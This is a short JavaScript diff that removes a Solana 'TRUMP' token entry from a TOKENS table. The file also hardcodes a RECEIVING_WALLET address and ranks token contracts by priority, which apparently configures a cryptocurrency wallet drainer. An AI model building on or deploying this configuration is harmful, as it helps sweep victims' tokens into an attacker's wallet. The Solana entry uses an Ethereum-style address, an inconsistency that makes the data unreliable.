@@ -2,18 +2,7 @@
 var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
 
 var TOKENS = {
- solana: [
-     {
-      name: "OFFICIAL TRUMP",
-      symbol: "TRUMP",
-      address: "0x7D21841DC10BA1C5797951EFc62fADBBD55B03bC",
-      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png", 
-      abi: ERC20_ABI,
-      decimals: 18,
-      priority: 14
-    },   
- ]
-  
+
   ethereum: [
     {
       name: "Tether USD",
